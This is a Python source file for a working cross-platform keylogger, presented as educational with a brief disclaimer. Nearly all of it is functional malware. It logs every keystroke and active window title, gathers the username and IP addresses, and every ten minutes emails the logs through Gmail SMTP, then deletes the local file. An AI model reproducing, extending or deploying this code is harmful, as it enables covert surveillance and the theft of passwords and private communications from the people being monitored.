# Keylogger for Educational Purposes
# DISCLAIMER: This code is provided strictly for educational and testing purposes.
# Misuse of this script to monitor or log unauthorized keystrokes is illegal and unethical.
# Please ensure you have explicit permission to use this script.

import os
import time
import requests
import socket
import random
import smtplib
import threading
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import platform
from dotenv import load_dotenv

# Load environment variables from a .env file for secure credential handling
load_dotenv()

# Configuration - Load email credentials from environment variables
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")  # Sender email address
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")  # Sender email password

# Basic information to include in logs
datetime = time.ctime(time.time())  # Current date and time
user = os.getlogin()  # Username of the logged-in user
publicIP = requests.get('https://api.ipify.org/').text  # Public IP address
privateIP = socket.gethostbyname(socket.gethostname())  # Private IP address

# Initialize log storage
LOGS = [
    f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
]
CURRENT_WINDOW = None  # Track the currently active window


def get_active_window():
    """Retrieve the title of the currently active window in a cross-platform manner."""
    try:
        if platform.system() == "Windows":
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buffer, length + 1)
            return buffer.value
        elif platform.system() == "Darwin":
            # macOS specific window handling
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()["NSApplicationName"]
        else:
            # Assume Linux/Unix
            from subprocess import check_output
            return check_output(["xdotool", "getwindowfocus", "getwindowname"]).decode("utf-8").strip()
    except Exception as e:
        return f"Unknown Window ({e})"


def on_press(key):
    """Capture keystrokes and log them, including window change events."""
    global CURRENT_WINDOW

    # Check if the active window has changed
    active_window = get_active_window()
    if active_window != CURRENT_WINDOW:
        CURRENT_WINDOW = active_window
        LOGS.append(f'\n[{datetime}] ~ {CURRENT_WINDOW}\n')  # Log the new window title

    # Convert the key press into a readable format
    key = str(key).strip("'")
    substitutions = {
        "Key.enter": "[ENTER]\n", "Key.backspace": "[BACKSPACE]", "Key.space": " ",
        "Key.tab": "[TAB]", "Key.shift": "[SHIFT]", "Key.ctrl_l": "[CTRL]",
        "Key.alt_l": "[ALT]", "Key.caps_lock": "[CAPS LOCK]"
    }
    LOGS.append(substitutions.get(key, key))  # Log the key, substituting if needed


def write_logs():
    """Write the collected logs to a temporary file and return the file path."""
    temp_dir = os.path.join(os.path.expanduser("~"), "temp_logs")  # Temporary directory
    os.makedirs(temp_dir, exist_ok=True)  # Ensure the directory exists
    filename = os.path.join(temp_dir, f"log_{random.randint(1000, 9999)}.txt")  # Random file name

    # Write logs to the file
    with open(filename, 'w') as file:
        file.write(''.join(LOGS))

    LOGS.clear()  # Clear the log buffer after writing
    return filename


def send_email(file_path):
    """Send the logs as an email attachment."""
    try:
        # Prepare the email message
        with open(file_path, 'rb') as attachment:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS  # Send to yourself for simplicity
            msg['Subject'] = "Keylogger Logs"

            # Email body
            body = "Attached are the latest keylogger logs."
            msg.attach(MIMEText(body, 'plain'))

            # Attach the log file
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
            msg.attach(part)

        # Send the email using SMTP
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Secure the connection
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)  # Authenticate
            server.send_message(msg)  # Send the email

        os.remove(file_path)  # Clean up the log file after sending
    except Exception as e:
        print(f"Error sending email: {e}")  # Print any errors for debugging


def periodic_email():
    """Periodically send collected logs via email."""
    while True:
        time.sleep(600)  # Wait for 10 minutes
        if LOGS:
            log_file = write_logs()  # Write logs to a file
            send_email(log_file)  # Email the file


if __name__ == "__main__":
    # Start the periodic email thread
    threading.Thread(target=periodic_email, daemon=True).start()

    # Start listening for key presses
    with Listener(on_press=on_press) as listener:
        listener.join()
